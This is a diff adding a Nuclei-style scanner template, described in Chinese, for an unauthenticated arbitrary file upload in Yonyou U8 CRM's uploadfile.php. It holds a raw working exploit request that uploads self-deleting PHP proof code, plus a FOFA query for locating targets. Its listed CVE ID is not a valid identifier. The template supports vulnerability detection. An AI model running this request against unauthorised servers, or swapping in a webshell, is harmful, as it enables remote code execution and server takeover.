@@ -1,0 +1,71 @@
+id: 2024-105201748
+
+info:
+  name: 用友CRM系统uploadfile.php接口存在任意文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    用友CRM系统uploadfile.php接口存在任意文件上传，，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BCRM%E7%B3%BB%E7%BB%9Fuploadfile.php%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  remediation: |
+    打官方对应补丁，重启服务
+  classification:
+    cve-id: 2024-105201748
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-05-18
+    version: 用友CRM系统
+    fofa-query: app="用友U8CRM"
+  tags: fileupload,rce,yonyou
+
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "file error"
+  pay1: '<?php echo 11*11;unlink(__FILE__);'
+
+
+http:
+  - raw:
+    - |
+      POST /ajax/uploadfile.php?DontCheckLogin=1&vname=file HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+ 
+      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+      Content-Disposition: form-data; name="file"; filename="%s.php "
+      Content-Type: application/octet-stream
+ 
+      <?php print(1111*2222);unlink(__FILE__);?>
+      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+      Content-Disposition: form-data; name="upload"
+ 
+      upload
+      ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--
+ 
+    - |
+      GET /tmpfile/{{uploadfile}} HTTP/1.1
+      Host: {{Hostname}}
+ 
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        name: uploadfile
+        regex:
+          - '(upd\w+\.tmp\.php)'
+        internal: true
+ 
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '2468642'
+ 
+      - type: status
+        status:
+          - 200
